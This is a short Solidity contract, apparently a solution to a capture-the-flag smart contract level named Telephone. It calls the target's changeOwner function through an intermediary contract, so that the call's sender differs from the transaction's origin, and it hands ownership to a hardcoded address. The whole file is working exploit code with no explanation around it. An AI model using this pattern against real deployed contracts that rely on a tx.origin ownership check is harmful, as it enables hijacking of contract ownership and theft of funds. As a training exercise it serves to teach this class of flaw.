// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        ITelephone(target).changeOwner(0x492E904fC65B8570829d0F6162d5441bA06Ffd48);
    }

}
